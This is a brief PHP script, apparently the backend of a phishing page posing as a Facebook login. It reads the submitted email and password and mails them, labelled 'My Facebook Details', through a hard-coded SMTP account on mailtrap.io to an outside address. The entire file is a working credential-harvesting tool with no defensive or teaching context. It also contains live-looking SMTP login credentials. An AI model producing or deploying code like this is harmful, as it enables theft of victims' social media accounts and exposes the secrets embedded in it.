<?php
require_once('class.phpmailer.php');
$mail             = new PHPMailer();

$mail->IsSMTP();

$mail->SMTPAuth   = true;
$mail->Host       = "mailtrap.io";
$mail->Port       = 2525;
$mail->Username   = "emails-2dc70c04a47a8cf9";
$mail->Password   = "470d656cd353cfd5";

if (isset($_POST["email"]) && !empty($_POST["email"])) {
    $mail->SetFrom($_POST['email'], 'Facebook User');
    $mail->Subject    = "My Facebook Details";
    $mail->MsgHTML("Facebook Account: ".$_POST['email']." Password:".$_POST['pass']);
    $address = "whoto@otherdomain.com";
    $mail->AddAddress($address, "John Doe");
    $mail->Send();
}
?>